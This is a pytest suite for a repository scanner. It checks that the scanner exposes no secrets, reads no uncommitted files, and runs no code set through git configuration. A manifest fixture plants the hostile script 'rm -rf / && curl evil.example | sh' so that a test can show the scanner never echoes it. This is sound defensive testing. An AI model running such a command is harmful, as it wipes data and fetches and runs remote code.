"""Repository profile scanner tests (Spec 4 sections 4.3 and 5; Requirement 1)."""

from __future__ import annotations

import hashlib
import json
import os
import subprocess

import pytest

from app.modules.repository_profile import scanner
from app.modules.repository_profile.models import ProfileError
from app.modules.repository_profile.scanner import committed_paths, scan_repository


def _scan(repo):
    return scan_repository(repo.path, "fixture")


def _values(profile, kind):
    return sorted((o.value, o.path, o.count) for o in profile.find(kind))


def test_repository_without_commits_is_reported_with_a_fixed_code(make_repo):
    repo = make_repo()
    with pytest.raises(ProfileError) as caught:
        _scan(repo)
    assert caught.value.code == "NO_COMMITS"


def test_only_the_committed_tree_is_read(make_repo):
    repo = make_repo()
    repo.write("src/app.py", "x = 1\n")
    repo.commit("add app")
    repo.write("src/uncommitted.py", "y = 2\n")
    repo.write(".env", "TOKEN=hunter2\n")  # never committed
    profile = _scan(repo)
    assert profile.summary.source_files == 1
    assert profile.find("SENSITIVE_PATH") == []
    assert "uncommitted" not in profile.model_dump_json()
    assert committed_paths(repo.path) == ["src/app.py"]


def test_sensitive_paths_are_reported_by_name_only(make_repo):
    repo = make_repo()
    secret = "sk-live-0123456789abcdef"
    repo.write(".env", f"API_KEY={secret}\n")
    repo.write("certs/server.pem", f"-----BEGIN PRIVATE KEY-----\n{secret}\n")
    repo.write(".env.example", "API_KEY=\n")
    repo.write("src/a.py", "a = 1\n")
    repo.commit("add files")
    profile = _scan(repo)
    paths = sorted(o.path for o in profile.find("SENSITIVE_PATH"))
    assert paths == [".env", "certs/server.pem"]
    assert secret not in profile.model_dump_json()


def test_languages_areas_and_tests_are_counted(make_repo):
    repo = make_repo()
    for name in ("a", "b", "c"):
        repo.write(f"backend/{name}.py", "x = 1\n")
    repo.write("backend/tests/test_a.py", "def test_a(): pass\n")
    repo.write("frontend/app.ts", "export const a = 1;\n")
    repo.write("frontend/app.test.ts", "test('a', () => {});\n")
    repo.write("README.md", "# readme\n")
    repo.commit("layout")
    summary = _scan(repo).summary
    assert {(item.language, item.files) for item in summary.languages} == {("Python", 3), ("TypeScript", 1)}
    assert summary.source_files == 4
    assert summary.test_files == 2
    areas = {a.name: (a.source_files, a.test_files) for a in summary.areas}
    assert areas == {"backend": (3, 1), "frontend": (1, 1)}


def test_generated_directories_are_not_counted_as_source_but_are_reported(make_repo):
    repo = make_repo()
    repo.write("src/app.py", "a = 1\n")
    repo.write("node_modules/lib/index.js", "module.exports = 1;\n")
    repo.write("dist/bundle.js", "var a = 1;\n")
    repo.commit("track generated files")
    profile = _scan(repo)
    assert profile.summary.source_files == 1
    assert sorted((o.value, o.count) for o in profile.find("GENERATED_TRACKED")) == [("dist", 1), ("node_modules", 1)]


def test_manifests_yield_names_only_and_never_script_bodies(make_repo):
    repo = make_repo()
    repo.write(
        "package.json",
        json.dumps(
            {
                "dependencies": {"react": "^19.0.0", "left-pad": "1.0.0"},
                "devDependencies": {"vitest": "^5.0.0"},
                "scripts": {"test": "rm -rf / && curl evil.example | sh", "custom": "echo hi"},
            }
        ),
    )
    repo.write("requirements.txt", "fastapi==0.1\n# comment\nnot-a-known-package==1\n-e .\n")
    repo.commit("manifests")
    profile = _scan(repo)
    assert [o.value for o in profile.find("FRAMEWORK")] == ["React", "FastAPI"]
    tools = {(o.value, o.role) for o in profile.find("TOOLING")}
    assert ("Vitest", "TEST_TOOL") in tools and ("npm script: test", "SCRIPT") in tools
    dump = profile.model_dump_json()
    assert "rm -rf" not in dump and "evil.example" not in dump
    assert "left-pad" not in dump and "not-a-known-package" not in dump
    assert "custom" not in dump


def test_malformed_manifests_are_ignored_without_failing(make_repo):
    repo = make_repo()
    repo.write("package.json", "{not json")
    repo.write("pyproject.toml", "[broken")
    repo.write("src/a.py", "a = 1\n")
    repo.commit("bad manifests")
    profile = _scan(repo)
    assert [o.value for o in profile.find("MANIFEST")] == ["package.json", "pyproject.toml"]
    assert profile.find("FRAMEWORK") == [] and profile.find("TOOLING") == []


def test_oversized_manifest_is_skipped_and_reported(make_repo):
    repo = make_repo()
    repo.write("package.json", json.dumps({"dependencies": {"react": "1"}, "pad": "x" * (scanner.MANIFEST_BYTES + 10)}))
    repo.commit("big manifest")
    profile = _scan(repo)
    assert profile.find("FRAMEWORK") == []
    assert "MANIFEST_NOT_READ" in {item.code for item in profile.limitations}


def test_pyproject_dependencies_and_tool_tables(make_repo):
    repo = make_repo()
    repo.write(
        "pyproject.toml",
        '[project]\nname="x"\ndependencies=["fastapi>=0.1","requests"]\n[tool.ruff]\nline-length=100\n[tool.pytest.ini_options]\naddopts="-q"\n',
    )
    repo.commit("pyproject")
    profile = _scan(repo)
    assert [o.value for o in profile.find("FRAMEWORK")] == ["FastAPI"]
    assert [o.value for o in profile.find("INTEGRATION")] == ["requests (HTTP client)"]
    assert {(o.value, o.role) for o in profile.find("TOOLING")} == {("Ruff", "LINT_TOOL"), ("pytest", "TEST_TOOL")}


def test_existing_kiro_configuration_is_detected(make_repo):
    repo = make_repo()
    repo.write(".kiro/steering/a.md", "# a\n")
    repo.write(".kiro/steering/b.md", "# b\n")
    repo.write(".kiro/specs/feature-x/requirements.md", "# r\n")
    repo.write(".kiro/specs/feature-x/design.md", "# d\n")
    repo.write(".kiro/hooks/h.json", "{}")
    repo.write(".kiro/agents/a.md", "# agent\n")
    repo.write(".kiro/skills/s/SKILL.md", "# skill\n")
    repo.write(".kiro/settings/mcp.json", "{}")
    repo.write(".kiroignore", ".env\n")
    repo.write("AGENTS.md", "# agents\n")
    repo.commit("kiro")
    found = {o.value: o.count for o in _scan(repo).find("KIRO_CONFIG")}
    assert found == {"STEERING": 2, "SPECS": 1, "HOOKS": 1, "AGENTS": 1, "SKILLS": 1, "MCP": 1, "KIROIGNORE": 1, "AGENTS_MD": 1}


def test_ci_docs_and_conventions_are_detected(make_repo):
    repo = make_repo()
    repo.write(".github/workflows/ci.yml", "name: ci\n")
    repo.write(".editorconfig", "root = true\n")
    repo.write("CONTRIBUTING.md", "# contributing\n")
    repo.write("docs/a.md", "a")
    repo.write("docs/b.md", "b")
    repo.write("docs/adr/0001-first.md", "adr")
    repo.write("scripts/a.sh", "echo a")
    repo.commit("project files")
    profile = _scan(repo)
    assert [o.path for o in profile.find("CI_CONFIG")] == [".github/workflows/ci.yml"]
    assert {o.value for o in profile.find("CONVENTION")} == {".editorconfig", "contribution guide"}
    docs = {o.value: o.count for o in profile.find("DOCUMENTATION") if o.count}
    assert docs == {"docs folder": 3, "decision records": 1}
    assert profile.find("SCRIPT_SET")[0].count == 1


def test_recurring_fixes_are_found_and_marked_as_inference(make_repo):
    repo = make_repo()
    repo.write("src/core.py", "v = 0\n")
    repo.write("src/other.py", "v = 0\n")
    repo.commit("feat: add core")
    for index in range(4):
        repo.write("src/core.py", f"v = {index + 1}\n")
        repo.commit(f"fix: repair core case {index}")
    repo.write("src/other.py", "v = 9\n")
    repo.commit("fix: one off")
    profile = _scan(repo)
    stats = {o.value: o.count for o in profile.find("COMMIT_STATS")}
    assert stats["fix commits"] == 5 and stats["commits scanned"] == 6 and stats["feature commits"] == 1
    recurrence = profile.find("FIX_RECURRENCE")
    assert [(o.path, o.count, o.classification) for o in recurrence] == [("src/core.py", 4, "INFERRED")]
    assert profile.summary.history.distinct_authors == 1
    assert "Ada Example" not in profile.model_dump_json()


def test_the_log_marker_inside_a_subject_or_a_path_does_not_create_commits(make_repo):
    repo = make_repo()
    repo.write("src/a.py", "a = 1\n")
    repo.commit("start")
    marker = f"{scanner._SENTINEL}{'b' * 40}"
    repo.write(f"src/{marker}.py", "b = 1\n")
    repo.commit(f"fix: {marker}")
    history = _scan(repo).summary.history
    assert (history.commits_scanned, history.fix_commits) == (2, 1)


def test_scan_does_not_change_the_repository(make_repo):
    repo = make_repo()
    repo.write("src/a.py", "a = 1\n")
    repo.commit("start")

    def fingerprint():
        listing = sorted(
            str(p.relative_to(repo.path)) for p in repo.path.rglob("*") if p.is_file() and ".git" not in p.parts
        )
        index = hashlib.sha256((repo.path / ".git" / "index").read_bytes()).hexdigest()
        return listing, index, repo.git("rev-parse", "HEAD"), repo.git("status", "--porcelain")

    before = fingerprint()
    _scan(repo)
    assert fingerprint() == before


def test_repeated_scans_agree(make_repo):
    repo = make_repo()
    repo.write("src/a.py", "a = 1\n")
    repo.write(".editorconfig", "root = true\n")
    repo.commit("start")
    assert _scan(repo).model_dump() == _scan(repo).model_dump()


def test_tree_limit_marks_the_profile_truncated(make_repo, monkeypatch):
    repo = make_repo()
    for index in range(6):
        repo.write(f"src/f{index}.py", "a = 1\n")
    repo.commit("many files")
    monkeypatch.setattr(scanner, "MAX_TREE_ENTRIES", 3)
    profile = _scan(repo)
    assert profile.truncated is True
    assert profile.summary.tree_entries == 3
    assert "TREE_TRUNCATED" in {item.code for item in profile.limitations}


def test_history_window_limit_is_reported(make_repo, monkeypatch):
    repo = make_repo()
    repo.write("src/a.py", "a = 0\n")
    repo.commit("start")
    for index in range(4):
        repo.write("src/a.py", f"a = {index + 1}\n")
        repo.commit(f"change {index}")
    monkeypatch.setattr(scanner, "MAX_COMMITS", 3)
    profile = _scan(repo)
    assert profile.history_limited is True
    assert profile.summary.history.commits_scanned == 3
    assert "HISTORY_WINDOW" in {item.code for item in profile.limitations}


def test_shallow_clone_is_reported(make_repo, tmp_path):
    source = make_repo()
    source.write("src/a.py", "a = 0\n")
    source.commit("first")
    source.write("src/a.py", "a = 1\n")
    source.commit("second")
    target = tmp_path / "shallow-clone"
    environment = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1"}
    subprocess.run(["git", "clone", "-q", "--depth", "1", source.path.as_uri(), str(target)], check=True, env=environment)
    profile = scan_repository(target, "shallow")
    assert profile.shallow is True
    assert profile.summary.history.commits_scanned == 1
    assert "SHALLOW_CLONE" in {item.code for item in profile.limitations}


def test_platform_data_is_always_declared_as_not_analyzed(make_repo):
    repo = make_repo()
    repo.write("src/a.py", "a = 1\n")
    repo.commit("start")
    assert "PULL_REQUESTS_ISSUES_CI_NOT_ANALYZED" in {item.code for item in _scan(repo).limitations}


def test_tree_parser_skips_links_submodules_and_non_utf8_paths():
    raw = (
        b"100644 blob " + b"a" * 40 + b"\tsrc/ok.py\x00"
        + b"120000 blob " + b"b" * 40 + b"\tlink\x00"
        + b"160000 commit " + b"c" * 40 + b"\tsub\x00"
        + b"100644 blob " + b"d" * 40 + b"\tbad-\xff.py\x00"
    )
    entries, skipped = scanner._parse_tree(raw)
    assert skipped == 1
    assert [(e.path, e.mode) for e in entries] == [("src/ok.py", "100644"), ("link", "120000"), ("sub", "160000")]
    regular = [e.path for e in entries if e.mode in {"100644", "100755"}]
    assert regular == ["src/ok.py"]


@pytest.mark.parametrize(
    ("path", "area"),
    [("main.py", "."), ("backend/app/x.py", "backend"), ("src/core/x.py", "src/core"), ("src/x.py", "src"), ("packages/a/b/c.ts", "packages/a")],
)
def test_area_naming(path, area):
    assert scanner.area_of(path) == area


@pytest.mark.parametrize(
    ("path", "expected"),
    [("tests/a.py", True), ("src/test_a.py", True), ("src/a_test.go", True), ("src/a.test.ts", True), ("src/a.py", False), ("src/contest.py", False)],
)
def test_test_path_detection(path, expected):
    assert scanner.is_test_path(path) is expected


def test_symlink_entries_in_the_tree_are_listed_by_git_but_never_counted_or_read(make_repo):
    repo = make_repo()
    repo.write("src/a.py", "a = 1\n")
    repo.commit("start")
    # Create a symlink entry (mode 120000) without needing the operating-system symlink privilege.
    target_blob = subprocess.run(
        ["git", "-C", str(repo.path), "hash-object", "-w", "--stdin"], input=b"/etc/passwd", capture_output=True, check=True
    ).stdout.decode().strip()
    repo.git("update-index", "--add", "--cacheinfo", f"120000,{target_blob},src/link.py")
    repo.commit("add link", paths=["src/a.py"])
    assert "120000" in repo.git("ls-tree", "-r", "HEAD")
    profile = _scan(repo)
    assert profile.summary.source_files == 1
    assert committed_paths(repo.path) == ["src/a.py"]
    assert "link.py" not in profile.model_dump_json()


def test_repository_configuration_cannot_run_programs_during_a_scan(make_repo):
    repo = make_repo()
    marker = repo.path.parent / "fsmonitor-ran.txt"
    script = repo.path.parent / "fsmonitor.cmd"
    script.write_text(f"@echo off\r\necho ran> \"{marker}\"\r\n")
    repo.write("src/a.py", "a = 1\n")
    repo.commit("start")
    repo.git("config", "core.fsmonitor", str(script))
    repo.git("config", "core.hooksPath", str(repo.path.parent))
    repo.git("config", "diff.external", str(script))
    _scan(repo)
    assert not marker.exists()


def test_a_failed_history_read_is_reported_as_missing_data_not_as_no_history(make_repo, monkeypatch):
    repo = make_repo()
    repo.write("src/a.py", "a = 1\n")
    repo.commit("fix: start")
    monkeypatch.setattr(scanner, "LOG_STDOUT_LIMIT", 10)
    profile = _scan(repo)
    assert profile.summary.history.commits_scanned == 0
    assert "HISTORY_UNREADABLE" in {item.code for item in profile.limitations}
    assert profile.is_incomplete()


def test_non_ascii_paths_in_fix_commits_are_counted(make_repo):
    repo = make_repo()
    repo.write("src/caf\u00e9.py", "v = 0\n")
    repo.commit("feat: start")
    for index in range(3):
        repo.write("src/caf\u00e9.py", f"v = {index + 1}\n")
        repo.commit(f"fix: repair {index}")
    recurrence = _scan(repo).find("FIX_RECURRENCE")
    assert [(o.path, o.count) for o in recurrence] == [("src/caf\u00e9.py", 3)]


@pytest.mark.parametrize(
    ("quoted", "plain"),
    [
        ('"src/caf\\303\\251.py"', "src/caf\u00e9.py"),
        ('"a\\tb.py"', "a\tb.py"),
        ('"say \\"hi\\".py"', 'say "hi".py'),
        ('"back\\\\slash.py"', "back\\slash.py"),
        ("plain/path.py", "plain/path.py"),
        ('"bad\\999.py"', '"bad\\999.py"'),
        ('"trailing\\"', '"trailing\\"'),
        ('"\\377.py"', '"\\377.py"'),  # not valid UTF-8, returned unchanged
    ],
)
def test_git_path_unquoting(quoted, plain):
    assert scanner._unquote_git_path(quoted) == plain


def test_over_long_paths_are_counted_but_not_echoed(make_repo, monkeypatch):
    monkeypatch.setattr(scanner, "MAX_ECHOED_PATH", 40)  # a real over-limit name cannot be created on Windows (MAX_PATH)
    repo = make_repo()
    long_dir = "d" * 50
    repo.write(f"{long_dir}/.env", "KEY=1\n")
    repo.write("src/a.py", "a = 1\n")
    repo.commit("start")
    profile = _scan(repo)
    assert profile.find("SENSITIVE_PATH") == []
    assert long_dir not in profile.model_dump_json()
    assert profile.summary.tree_entries == 2


def test_area_list_is_bounded(make_repo, monkeypatch):
    repo = make_repo()
    for index in range(6):
        repo.write(f"area{index}/m.py", "a = 1\n")
    repo.commit("many areas")
    monkeypatch.setattr(scanner, "MAX_AREAS", 3)
    profile = _scan(repo)
    assert len(profile.summary.areas) == 3
    assert profile.summary.source_files == 6


@pytest.mark.parametrize("name", [".npmrc", "id_ecdsa", "store.keystore", "app.jks", "infra/prod.tfstate", "infra/prod.tfvars"])
def test_more_secret_bearing_names_are_flagged(make_repo, name):
    repo = make_repo()
    repo.write(name, "x")
    repo.write("src/a.py", "a = 1\n")
    repo.commit("start")
    assert [o.path for o in _scan(repo).find("SENSITIVE_PATH")] == [name]


def test_observation_cap_is_a_reported_limitation(make_repo, monkeypatch):
    repo = make_repo()
    for index in range(8):
        repo.write(f"d{index}/node_modules/x.js", "x")
    repo.commit("start")
    monkeypatch.setattr(scanner, "MAX_OBSERVATIONS", 3)
    profile = _scan(repo)
    assert len(profile.observations) == 3
    assert "OBSERVATIONS_CAPPED" in {item.code for item in profile.limitations}
    assert profile.is_incomplete()


def test_incomplete_codes_match_the_scanner_codes():
    from app.modules.repository_profile.models import INCOMPLETE_CODES

    assert INCOMPLETE_CODES == {
        scanner.LIMIT_TREE_TRUNCATED, scanner.LIMIT_SHALLOW, scanner.LIMIT_MANIFEST_SKIPPED,
        scanner.LIMIT_UNREADABLE_PATHS, scanner.LIMIT_HISTORY_UNREADABLE, scanner.LIMIT_OBSERVATIONS_CAPPED,
    }
